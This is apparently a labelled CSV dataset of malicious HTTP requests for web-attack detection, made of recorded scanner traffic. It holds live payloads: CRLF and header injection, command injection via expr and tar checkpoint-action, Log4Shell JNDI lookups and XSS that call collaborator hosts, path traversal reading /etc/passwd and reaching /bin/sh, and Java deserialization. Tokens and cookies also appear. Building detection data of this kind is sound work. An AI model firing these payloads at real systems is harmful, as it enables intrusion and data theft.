id,method,user_agent,url,refer,body,lable
924,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20816614575%20%2B%20867282237%20%20%23,,,4
866,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/assets/js/runtime.cb5999c45c256e7298d3.js,http://124.70.151.147:9180/,"GET /iC3gbW5W/assets/js/runtime.cb5999c45c256e7298d3.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/assets/js/runtime.cb5999c45c256e7298d3.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
949,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"OPTIONS / HTTP/1.1 Authorization: Basic YW5vbnltb3VzOmFub255bW91cw== Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /login/pin?_=pin%00&encrypt=false&needCaptcha=false HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/xbYbav7E~500~appoint~auth~detail~identify~main~print~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/1%20waitfor%20delay%20'0:0:15'%20--%20~404~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
123,\xAC\xED\0\x05sr\02sun.reflect.annotation.AnnotationInvocationHandlerU\xCA\xF5\x0F\x15\xCB~\xA5\x02\0\x02L\0,,memberValuest\0\x0FLjava/util/Map;L\0\x04typet\0\x11Ljava/lang/Class;xps}\0\0\0\x01\0\x0Djava.util.Mapxr\0\x17java.lang.reflect.Proxy\xE1'\xDA,,,4
623,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs/assets/js/361.24d56b167ce5f58cf75e.js,http://124.70.151.147:9180/,"GET /qyswebapp/response.write(9840241*9586989)/js/361.24d56b167ce5f58cf75e.js HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs/assets/js/361.24d56b167ce5f58cf75e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1439,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 SocketLog(tabid=795&client_id=)",/?arg=-n&arg=score-coupon&arg=coupon-api-3ff485-5fcf8f5c84-4dbqh&arg=-c&arg=score-coupon-qa&arg=env&arg=COLUMNS=1920&arg=LINES=1080&arg=/bin/sh&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTcyNTk1MTcsImlzcyI6IjEyMDAwNjEzODEifQ.E3dlmb3KlKFP4BGba1hIo18ceUYHFQBmDZYn7_YAPfc,,,4
674,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20912515803%20%2b%20910503581%22%0A%27,,,4
1085,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~404~%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"GET /login/token?_=%24%7Bj%24%7B::-n%7Ddi:dns%24%7B::-:%7D//hitlxqctohvaq72ef3%24%7B::-.%7Dbxss.me%7D HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /login/pin?_='%22&encrypt=false&needCaptcha=false HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/%E5%98%8A%E5%98%8D%0ASomeCustomInjectedHeader:%20injected_by_wvs~500~appoint~auth~detail~identify~main~print~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~500~appoint~auth~detail~identify~main~print~sign~%3f%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~404~%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1371,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20882787102%20-%20853724725%0A%27,,,4
208,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/projects/wiki/activity?amp=&amp=&amp=&amp=&from=2022-07-16&show_messages=1&submit=%E5%BA%94%E7%94%A8&user_id=%250d%250aCRLF-Header%3ACRLF-Value&utf8=%E2%9C%93,http://10.19.159.21:1001/projects/wiki/activity?utf8=%E2%9C%93&from=2022-07-26&user_id=&show_messages=1&submit=%E5%BA%94%E7%94%A8,,4
360,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_b2d2-5543066de5b78ab6.pdf%0d%0aBCC%3avutl5kz2qy43qqwxnzspk6euslyimaa23quih85x@burpcollaborator.net%0d%0atkv%3a%20u,http://121.4.111.58:3000/ftp,"GET /ftp/order_b2d2-5543066de5b78ab6.pdf%0d%0aBCC%3avutl5kz2qy43qqwxnzspk6euslyimaa23quih85x@burpcollaborator.net%0d%0atkv%3a%20u HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",4
699,GET,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0),/ops/js/chunk-6487b56e.fce2cdb3.js?1%3e%0d%0aBCC%3anulpik971vcpk3kkwykt311lscyhq5iz6ttjh8@burpcollaborator.net%0d%0amfj%3a%20j=1,,,4
648,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20804287953%20%2b%20939523616%22%0A%27,,,4
675,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/check,http://124.70.151.147:9181/,"GET /%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/check HTTP/1.1 Referer: http://124.70.151.147:9181/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9181 Connection: Keep-alive  ",4
1061,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~sign~signature.e945fe21d19b897933f3.js,http://124.70.151.147:9180/,"GET /assets/js/%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~sign~signature.e945fe21d19b897933f3.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
191,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fl7tbiacs3oht3g9n0p5fxwrk5bb8zzxnped80yonX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fl7tbiacs3oht3g9n0p5fxwrk5bb8zzxnped80yonX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",4
450,GET,"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,,"GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1 Host: 120.132.241.135:2062 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",4
887,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs/check,http://124.70.151.147:9181/,"GET /%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs/check HTTP/1.1 Referer: http://124.70.151.147:9181/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9181 Connection: Keep-alive  ",4
846,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs/physical/open,http://124.70.151.147:9181/,"GET /%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs/physical/open HTTP/1.1 Referer: http://124.70.151.147:9181/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9181 Connection: Keep-alive  ",4
495,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20822666324%20%2B%20900756465%20%20%23,,,4
1185,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/wps_shop.cgi?action=showartikel&cat=nessus&catname=nessus&art=|id|,,,4
337,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/api?1%0d%0aBCC%3amvlaiwhkk2vzrxiouj8c7lf8xz3srjn7f03uqke9@burpcollaborator.net%0d%0asju%3a%20v=1,,"GET /api?1%0d%0aBCC%3amvlaiwhkk2vzrxiouj8c7lf8xz3srjn7f03uqke9@burpcollaborator.net%0d%0asju%3a%20v=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LZ2NxEqypze8n3Q49a7wPAoXU5Ty3HzMS1pU7EdWml5XMoYrjJgkbV6RD1OB; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxQG1haWwuY29tIiwicGFzc3dvcmQiOiIwNWE2NzFjNjZhZWZlYTEyNGNjMDhiNzZlYTZkMzBiYiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImRlZjIzYTQyZjUzODc5MjI1MzI4NmIwNjk2YmZiZWE0YjQzZDgxNTBlOGU0NmM3OTFkMDUzZTg1NmFlZDk2ZDYiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTAzLTE0VDAyOjM1OjI0LjAzMloiLCJ1cGRhdGVkQXQiOiIyMDIyLTAzLTE0VDA3OjAwOjQ2LjQxOFoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDcyNDEyNDYsImV4cCI6MTY0NzI1OTI0Nn0.TSLXboUDg8aTljBymqyzsybLcGCsBt2n6CmkOxjIEkylSKIkHFxaPgsq_fy5fqHItWi6lXx4xBwOEY71Wo53gKgCh9F-kaw7EUuodWHK1An4oZzq3474q7Mvzmw7pTd1akaGivae4RZJtvAzqDPmis34PgVEpgBPxoqc2n71oGI  ",4
1156,POST,,/zentao/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh,,echo ; echo Test$1By$1Zsf,4
587,POST,,/invoker/JMXInvokerServlet,,,4
344,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/suports/socket.io/vendor.js%0d%0aBCC%3a8t2y4xyfpb3gp3vamcr2jjd7ryxulld952ttlgb40@burpcollaborator.net%0d%0aivf%3a%20j,,"GET /suports/socket.io/vendor.js%0d%0aBCC%3a8t2y4xyfpb3gp3vamcr2jjd7ryxulld952ttlgb40@burpcollaborator.net%0d%0aivf%3a%20j HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv  ",4
235,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/rest/products/search%3e%0d%0aBCC%3acwcva3447ys4k9w6f094ojjia9g24t6hybm2ep4dt@burpcollaborator.net%0d%0akkv%3a%20q?q=,http://121.4.111.58:3000/,"GET /rest/products/search%3e%0d%0aBCC%3acwcva3447ys4k9w6f094ojjia9g24t6hybm2ep4dt@burpcollaborator.net%0d%0akkv%3a%20q?q= HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZX",4
